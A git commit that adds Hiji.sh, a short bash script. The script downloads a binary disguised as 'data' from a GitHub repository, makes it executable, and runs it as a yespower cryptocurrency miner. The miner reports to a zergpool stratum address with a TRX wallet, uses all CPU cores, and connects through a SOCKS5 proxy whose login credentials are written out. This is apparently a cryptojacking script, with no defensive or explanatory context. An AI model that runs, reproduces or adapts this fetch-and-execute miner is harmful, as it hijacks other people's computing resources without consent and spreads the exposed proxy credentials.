3dcf247461a502c19e5b5218b34613c471e45663
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-28 03:15:31 +0700

    Create Hiji.sh

---
+++ Hiji.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+apt update -y &&
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://niylfcpu:5fhstdyrxp27@45.140.13.119:9132
